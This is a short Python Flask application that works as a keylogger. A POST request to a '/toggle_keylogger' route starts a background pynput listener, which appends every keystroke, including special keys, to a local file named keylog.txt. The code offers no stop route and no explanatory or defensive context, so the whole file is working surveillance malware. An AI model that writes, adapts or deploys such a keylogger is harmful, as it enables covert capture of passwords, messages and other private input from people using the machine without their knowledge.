from flask import Flask, render_template, jsonify
from pynput import keyboard
import threading

app = Flask(__name__)

keylogger_active = False
log_file = "keylog.txt"
listener = None

def start_keylogger():
    def on_press(key):
        try:
            with open(log_file, "a") as file:
                file.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a") as file:
                file.write(f" [{key}] ")

    with keyboard.Listener(on_press=on_press) as new_listener:
        new_listener.join()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/toggle_keylogger', methods=['POST'])
def toggle_keylogger():
    global keylogger_active, listener
    
    if keylogger_active:
        return jsonify(status="already_active")
    
    keylogger_active = True
    listener = threading.Thread(target=start_keylogger)
    listener.start()
    
    return jsonify(status="active")

if __name__ == "__main__":
    app.run(debug=True, port=5000)
